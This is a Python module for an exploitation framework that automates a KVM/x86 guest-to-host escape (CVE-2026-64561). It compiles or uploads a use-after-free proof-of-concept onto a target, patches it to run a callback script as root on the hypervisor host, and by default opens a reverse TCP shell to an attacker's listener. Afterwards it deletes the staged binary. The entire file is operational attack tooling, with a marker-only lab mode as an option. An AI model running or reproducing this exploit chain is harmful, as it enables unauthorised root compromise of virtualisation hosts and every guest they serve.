#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""KVM/x86 Zapscape guest-to-host escape (CVE-2026-64561)."""

from __future__ import annotations

import os
import shlex
import shutil
import subprocess
import tempfile
import time
from pathlib import Path

from kittysploit import *
from core.lib.compiler.zig_compiler import ZigCompiler
from lib.exploit.handler import Reverse
from lib.post.linux.kvm_host_session import (
    PAYLOAD_MARKER,
    PAYLOAD_REVERSE_SHELL,
    ZAPSCAPE_CALLBACK,
    callback_lhost,
    callback_lport,
    callback_script_body,
    patch_zapscape_source,
    payload_mode,
    snapshot_session_ids,
    stage_callback_script,
    wait_for_new_sessions,
    zapscape_umh_script,
)
from lib.post.linux.system import System
from lib.post.linux.session import LinuxSessionMixin


class Module(Post, Reverse, System, LinuxSessionMixin):
    __info__ = {
        "name": "KVM x86 Zapscape Guest Escape (CVE-2026-64561)",
        "description": (
            "Runs the Zapscape PoC (KVM/x86 mmu_page_zap_pte() recursive-zap UAF with KASLR "
            "bypass) on a KVM/AMD hypervisor host via /dev/kvm. Default payload starts a reverse "
            "TCP shell as root on the host (new KittySploit session). Marker-only mode creates "
            "/Zapscape for lab verification."
        ),
        "author": ["Hyunwoo Kim (@v4bel)", "KittySploit Team"],
        "cve": ["CVE-2026-64561"],
        "platform": [Platform.LINUX],
        "arch": [Arch.X64],
        "session_type": [SessionType.SHELL, SessionType.SSH],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-64561",
        ],
        "tags": ["kvm", "x86", "amd", "svm", "guest-escape", "manage"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 2.5,
            "noise": 0.9,
            "value": 0.9,
            "requires": {
                "capabilities_any": ["shell"],
                "capabilities_all": [],
            },
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": ["shell"],
                "option_bindings": {"payload": PAYLOAD_REVERSE_SHELL},
                "suggested_followups": [],
            },
        },
    }

    remote_bin = OptString(
        "/tmp/.ks_kvm64561/poc",
        "Remote path for the compiled PoC binary",
        required=True,
    )
    success_path = OptString("/Zapscape", "Host file created on successful escape", required=False)
    payload = OptChoice(
        PAYLOAD_REVERSE_SHELL,
        "Host payload: reverse_shell opens root callback session; marker only touches success_path",
        required=False,
        choices=[PAYLOAD_REVERSE_SHELL, PAYLOAD_MARKER],
    )
    callback_host = OptString(
        "",
        "IP/host the KVM host can reach for reverse shell (default: lhost)",
        required=False,
    )
    wait_seconds = OptInteger(
        20,
        "Seconds to wait for host reverse-shell callback after PoC trigger",
        required=False,
    )
    use_remote_cache = OptBool(
        True,
        "Reuse cached binary on target for this kernel release",
        required=False,
    )
    clear_cache = OptBool(False, "Delete remote cache for this kernel before run", required=False)
    cleanup = OptBool(True, "Remove staged run-path binary after execution", required=False)
    timeout = OptInteger(600, "PoC execution timeout in seconds", required=False)
    confirm = OptBool(False, "Confirm intentional guest-to-host escape attempt", required=True)

    @staticmethod
    def _repo_root() -> Path:
        return Path(__file__).resolve().parents[5]

    def _exploit_dir(self) -> Path:
        return self._repo_root() / "data" / "exploits" / "CVE-2026-64561"

    @staticmethod
    def _as_bool(value) -> bool:
        if isinstance(value, bool):
            return value
        return str(value).strip().lower() in ("1", "true", "yes", "y", "on")

    def _opt_int(self, val, default: int, minimum: int | None = None) -> int:
        return self.linux_int_opt(val, default, minimum)

    def _payload_mode(self) -> str:
        return payload_mode(getattr(self.payload, "value", self.payload))

    def _prepare_poc_source(self, success: str) -> str | None:
        if self._payload_mode() == PAYLOAD_MARKER:
            return None
        lhost = callback_lhost(self, str(self.callback_host or "").strip())
        lport = callback_lport(self)
        if not lhost:
            raise ValueError("lhost or callback_host is required for reverse_shell payload")
        body = callback_script_body(lhost, lport, success)
        if not stage_callback_script(self, ZAPSCAPE_CALLBACK, body):
            raise RuntimeError(f"Could not stage host callback script at {ZAPSCAPE_CALLBACK}")
        print_status(
            f"Staged host callback script ({ZAPSCAPE_CALLBACK}) -> {lhost}:{lport} as root via UMH."
        )
        raw = (self._exploit_dir() / "poc.c").read_text(encoding="utf-8")
        return patch_zapscape_source(raw, zapscape_umh_script())

    def _target_kernel_release(self) -> str:
        return (self.linux_execute("uname -r 2>/dev/null", pty=False) or "").strip()

    def _cache_root(self, remote_bin: str) -> str:
        base = os.path.dirname(remote_bin) or "/tmp/.ks_kvm64561"
        return f"{base.rstrip('/')}/cache"

    def _cache_bin_path(self, remote_bin: str, kver: str) -> str:
        safe = kver.replace("/", "_")
        return f"{self._cache_root(remote_bin)}/{safe}/poc"

    def _prebuilt_local(self, kver: str) -> Path | None:
        root = self._exploit_dir() / "prebuilt"
        for candidate in (root / kver / "poc", root / "x86_64" / "poc"):
            if candidate.is_file():
                return candidate
        return None

    def _remote_cache_valid(self, cache_bin: str, kver: str) -> bool:
        qbin = shlex.quote(cache_bin)
        qkver = shlex.quote(kver)
        qstamp = shlex.quote(f"{cache_bin}.kver")
        out = self.linux_execute(
            f"test -s {qbin} && test -x {qbin} && test -f {qstamp} && "
            f"[ \"$(cat {qstamp} 2>/dev/null)\" = {qkver} ] && echo OK || echo MISS",
            pty=False,
        )
        return "OK" in (out or "")

    def _stamp_remote_cache(self, cache_bin: str, kver: str) -> None:
        qstamp = shlex.quote(f"{cache_bin}.kver")
        qkver = shlex.quote(kver)
        self.linux_execute(f"printf '%s' {qkver} > {qstamp}", pty=False)

    def _save_to_remote_cache(
        self,
        cache_bin: str,
        kver: str,
        *,
        data: bytes | None = None,
        src_bin: str | None = None,
    ) -> bool:
        qdir = self.linux_shell_quote(os.path.dirname(cache_bin))
        self.linux_execute(f"mkdir -p {qdir}", pty=False)
        if data is not None:
            if not self.linux_upload_bytes(data, cache_bin, executable=True, pty=False):
                return False
        elif src_bin:
            qsrc = shlex.quote(src_bin)
            qdst = shlex.quote(cache_bin)
            self.linux_execute(f"cp -f {qsrc} {qdst} && chmod +x {qdst}", pty=False)
            if not self.linux_file_exists(cache_bin):
                return False
        else:
            return False
        self._stamp_remote_cache(cache_bin, kver)
        print_success(
            f"Cached PoC on target ({self.linux_remote_file_size(cache_bin)} bytes, kver={kver})."
        )
        return True

    def _copy_remote_bin(self, src: str, dst: str) -> bool:
        if os.path.normpath(src) == os.path.normpath(dst):
            return self.linux_file_exists(src)
        qsrc = shlex.quote(src)
        qdst = shlex.quote(dst)
        qd = self.linux_shell_quote(os.path.dirname(dst) or ".")
        self.linux_execute(f"mkdir -p {qd}", pty=False)
        self.linux_execute(f"cp -f {qsrc} {qdst} && chmod +x {qdst}", pty=False)
        return self.linux_file_exists(dst)

    def _clear_remote_cache(self, remote_bin: str, kver: str) -> None:
        cache_bin = self._cache_bin_path(remote_bin, kver)
        qdir = shlex.quote(os.path.dirname(cache_bin))
        self.linux_execute(f"rm -rf {qdir}", pty=False)
        print_status(f"Remote cache cleared for kernel {kver}.")

    def _build_local_zig(self, poc_source: str | None = None) -> bytes | None:
        poc_src = self._exploit_dir() / "poc.c"
        if poc_source is None and not poc_src.is_file():
            return None
        compiler = ZigCompiler()
        if not compiler.is_available():
            return None
        with tempfile.TemporaryDirectory(prefix="ks_kvm64561_") as tmp:
            work = Path(tmp)
            (work / "poc.c").write_text(
                poc_source if poc_source is not None else poc_src.read_text(encoding="utf-8"),
                encoding="utf-8",
            )
            out_bin = work / "poc"
            print_status("Local cross-compile with Zig (static, pthread)...")
            try:
                result = subprocess.run(
                    [
                        compiler.zig_path,
                        "cc",
                        "-target",
                        "x86_64-linux-gnu",
                        "-O2",
                        "-static",
                        "-pthread",
                        str(work / "poc.c"),
                        "-o",
                        str(out_bin),
                    ],
                    capture_output=True,
                    text=True,
                    timeout=300,
                    cwd=str(work),
                )
            except Exception as exc:
                print_warning(f"Local Zig build failed: {exc}")
                return None
            if result.returncode != 0 or not out_bin.is_file():
                err = (result.stderr or result.stdout or "").strip()
                if err:
                    print_warning(f"Local Zig build: {err[:400]}")
                return None
            data = out_bin.read_bytes()
            print_success(f"Built poc locally with Zig ({len(data)} bytes).")
            return data

    def _build_on_target(self, remote_dir: str, poc_source: str | None = None) -> str | None:
        poc_src = self._exploit_dir() / "poc.c"
        if poc_source is None and not poc_src.is_file():
            print_error(f"Missing bundled source: {poc_src}")
            return None
        qdir = self.linux_shell_quote(remote_dir)
        self.linux_execute(f"mkdir -p {qdir}", pty=False)
        remote_c = f"{remote_dir.rstrip('/')}/poc.c"
        src_bytes = (
            poc_source.encode("utf-8")
            if poc_source is not None
            else poc_src.read_bytes()
        )
        print_status(f"Uploading poc.c ({len(src_bytes)} bytes)...")
        if not self.linux_upload_bytes(src_bytes, remote_c, pty=False):
            return None
        built = f"{remote_dir.rstrip('/')}/poc"
        qbuilt = shlex.quote(built)
        qc = shlex.quote(remote_c)
        print_status("Remote compile (gcc -O2 -static -pthread)...")
        out = self.linux_execute(
            f"cd {qdir} && gcc -O2 -static -pthread {qc} -o {qbuilt} 2>&1",
            timeout=300,
            pty=False,
        )
        if out:
            print_info(out)
        if not self.linux_file_exists(built):
            print_error("Remote gcc build failed — poc binary not found.")
            return None
        print_success(f"Built poc on target ({self.linux_remote_file_size(built)} bytes).")
        return built

    def _resolve_prebuilt_bytes(self, kver: str, *, load: bool) -> tuple[bytes | None, str]:
        path = self._prebuilt_local(kver)
        if path:
            if load:
                data = path.read_bytes()
                print_success(f"Using framework prebuilt ({len(data)} bytes, {path.parent.name}).")
                return data, "prebuilt"
            return None, "prebuilt"
        return None, "remote"

    def _can_build_locally(self) -> bool:
        return ZigCompiler().is_available() and (self._exploit_dir() / "poc.c").is_file()

    def _ensure_poc_bin(
        self,
        remote_bin: str,
        kver: str,
        *,
        poc_source: str | None = None,
    ) -> tuple[bool, str]:
        cache_bin = self._cache_bin_path(remote_bin, kver)
        remote_work = os.path.dirname(remote_bin) or "/tmp/.ks_kvm64561"
        use_cache = poc_source is None and self._payload_mode() == PAYLOAD_MARKER

        if self._as_bool(self.clear_cache):
            self._clear_remote_cache(remote_bin, kver)

        if use_cache and self._as_bool(self.use_remote_cache) and self._remote_cache_valid(cache_bin, kver):
            print_success(
                f"Remote cache hit ({self.linux_remote_file_size(cache_bin)} bytes, kver={kver})."
            )
            if self._copy_remote_bin(cache_bin, remote_bin):
                return True, "remote_cache"
            print_warning("Remote cache copy failed; rebuilding.")

        if use_cache:
            prebuilt, mode = self._resolve_prebuilt_bytes(kver, load=True)
            if prebuilt is not None:
                if self._save_to_remote_cache(cache_bin, kver, data=prebuilt):
                    if self._copy_remote_bin(cache_bin, remote_bin):
                        return True, mode
                if self.linux_upload_bytes(prebuilt, remote_bin, executable=True, pty=False):
                    return True, mode
                return False, mode

        local = self._build_local_zig(poc_source)
        if local is not None:
            if use_cache and self._save_to_remote_cache(cache_bin, kver, data=local):
                if self._copy_remote_bin(cache_bin, remote_bin):
                    return True, "local_zig"
            if self.linux_upload_bytes(local, remote_bin, executable=True, pty=False):
                return True, "local_zig"
            return False, "local_zig"

        built = self._build_on_target(remote_work, poc_source)
        if not built:
            return False, "remote_gcc"
        if use_cache and not self._save_to_remote_cache(cache_bin, kver, src_bin=built):
            print_warning("Remote build succeeded but cache write failed.")
        if not self._copy_remote_bin(built, remote_bin):
            return False, "remote_gcc"
        return True, "remote_gcc"

    def _has_kvm_access(self) -> bool:
        out = self.linux_execute(
            "test -c /dev/kvm && (test -r /dev/kvm && test -w /dev/kvm) && echo OK || echo NO",
            pty=False,
        )
        return "OK" in (out or "")

    def _cpu_has_svm(self) -> bool:
        out = self.linux_execute(
            "grep -E '(^| )svm( |$)' /proc/cpuinfo >/dev/null 2>&1 && echo OK || echo NO",
            pty=False,
        )
        return "OK" in (out or "")

    def _is_amd_host(self) -> bool:
        vendor = (
            self.linux_execute(
                "grep -m1 -i vendor /proc/cpuinfo 2>/dev/null | cut -d: -f2",
                pty=False,
            )
            or ""
        ).strip().lower()
        return "amd" in vendor or "authenticamd" in vendor.replace(" ", "")

    def check(self):
        if not self.linux_require_linux():
            return False
        if not self._as_bool(self.confirm):
            print_error("Refusing guest escape without confirm=true")
            return False

        arch = (self.linux_execute("uname -m 2>/dev/null", pty=False) or "").strip().lower()
        if arch not in ("x86_64", "amd64"):
            print_error(f"Architecture {arch or 'unknown'} is not supported (need x86_64).")
            return False

        if not (self._exploit_dir() / "poc.c").is_file():
            print_error(f"Missing bundled source: {self._exploit_dir() / 'poc.c'}")
            return False

        kver = self._target_kernel_release()
        if not kver:
            print_error("Could not read target kernel release (uname -r).")
            return False

        if not self._has_kvm_access():
            print_error(
                "/dev/kvm is missing or not readable/writable — need KVM hypervisor access "
                "(root or membership in the kvm group)."
            )
            return False

        if not self._cpu_has_svm():
            print_error("CPU lacks SVM — Zapscape targets AMD nested SVM/NPT on KVM/x86.")
            return False
        if not self._is_amd_host():
            print_warning("CPU vendor is not AMD; PoC is tuned for AMD SVM/NPT nested KVM.")

        if self._payload_mode() == PAYLOAD_REVERSE_SHELL:
            lhost = callback_lhost(self, str(self.callback_host or "").strip())
            if not lhost:
                print_error(
                    "reverse_shell payload requires lhost (or callback_host) reachable from the KVM host."
                )
                return False
            can_local = self._can_build_locally()
            can_remote = self.linux_command_exists("gcc")
            if not can_local and not can_remote:
                print_error(
                    "reverse_shell requires a patched PoC rebuild (prebuilt/cache skipped) — "
                    "install gcc on target or enable local Zig cross-compile."
                )
                return False
            print_status(
                f"Host callback target {lhost}:{callback_lport(self)} — listener starts at run time."
            )
            print_status(
                "Patched PoC will be rebuilt for reverse_shell (prebuilt and remote cache are skipped)."
            )
        else:
            _, prebuilt_mode = self._resolve_prebuilt_bytes(kver, load=False)
            cache_ok = False
            if self._as_bool(self.use_remote_cache):
                cache_bin = self._cache_bin_path(
                    str(self.remote_bin).strip() or "/tmp/.ks_kvm64561/poc", kver
                )
                cache_ok = self._remote_cache_valid(cache_bin, kver)

            can_local = self._can_build_locally()
            can_remote = self.linux_command_exists("gcc")
            if prebuilt_mode != "prebuilt" and not cache_ok and not can_local and not can_remote:
                print_error(
                    f"No prebuilt poc for {kver}, remote cache missing, Zig unavailable locally, "
                    "and target lacks gcc. Add "
                    f"data/exploits/CVE-2026-64561/prebuilt/{kver}/poc or install gcc on target."
                )
                return False

        print_warning(
            "CVE-2026-64561 targets Linux 7.1.3 x86_64 with hardcoded KASLR symbols. "
            "Other kernel builds require address re-derivation in poc.c."
        )
        if self._payload_mode() == PAYLOAD_MARKER:
            print_status(
                "Guest-to-host escape — success creates "
                f"{str(self.success_path).strip() or '/Zapscape'} as root (marker mode)."
            )
        return True

    def run(self):
        if not self.check():
            return False

        kver = self._target_kernel_release()
        remote_bin = str(self.remote_bin).strip() or "/tmp/.ks_kvm64561/poc"
        success = str(self.success_path).strip() or "/Zapscape"
        qsuccess = shlex.quote(success)
        mode = self._payload_mode()
        before_sessions: set[str] = set()
        poc_source: str | None = None

        if mode == PAYLOAD_REVERSE_SHELL:
            lhost = callback_lhost(self, str(self.callback_host or "").strip())
            lport = callback_lport(self)
            before_sessions = snapshot_session_ids(self.framework)
            if not self.start_handler():
                print_error("Could not start reverse TCP listener for host callback.")
                return False
            time.sleep(1.0)
            try:
                poc_source = self._prepare_poc_source(success)
            except (ValueError, RuntimeError) as exc:
                print_error(str(exc))
                self.stop_handler()
                return False

        ok, source = self._ensure_poc_bin(remote_bin, kver, poc_source=poc_source)
        if not ok:
            if mode == PAYLOAD_REVERSE_SHELL:
                self.stop_handler()
            return False
        if source != "remote_cache":
            print_status(f"PoC staged from {source}.")

        qbin = shlex.quote(remote_bin)
        run_timeout = max(120, self._opt_int(self.timeout, 600, minimum=120))

        print_warning(f"Running Zapscape PoC (timeout={run_timeout}s): {qbin}")
        if mode == PAYLOAD_REVERSE_SHELL:
            print_status(
                "UMH will run staged callback as root on the host; watch for a new shell session."
            )
        else:
            print_status(
                "PoC forks a VM-owning child — parent exits after host-side marker creation."
            )

        out = self.linux_execute(qbin, timeout=run_timeout, pty=False)
        if out:
            print_info(out)

        success_flag = False
        if mode == PAYLOAD_REVERSE_SHELL:
            wait_s = max(5, self._opt_int(self.wait_seconds, 20, minimum=5))
            new_sessions = wait_for_new_sessions(self.framework, before_sessions, wait_s)
            if new_sessions:
                print_success(
                    f"Host root callback session(s): {', '.join(new_sessions)} — use 'sessions' to interact."
                )
                success_flag = True
            else:
                print_warning(
                    f"No callback within {wait_s}s. Ensure {callback_lhost(self, str(self.callback_host or '').strip())}:"
                    f"{callback_lport(self)} is reachable from the KVM host."
                )

        marker = self.linux_execute(
            f"test -f {qsuccess} && ls -la {qsuccess} || echo MISSING",
            pty=False,
        )
        if marker and "MISSING" not in marker:
            print_success(f"Host escape indicator present: {success}")
            print_info(marker.strip())
            success_flag = True
        elif out and ("[+] /Zapscape created" in out or "exploit completed" in out.lower()):
            print_success("PoC reported successful host-side file creation.")
            success_flag = True
        elif mode == PAYLOAD_MARKER and not success_flag:
            print_warning(
                f"Success marker {success!r} not found. KASLR/MM spray is timing-sensitive — retry."
            )

        if self._as_bool(self.cleanup):
            self.linux_execute(f"rm -f {qbin}", pty=False)
            print_status("Staged run-path binary removed (remote cache preserved).")

        return success_flag
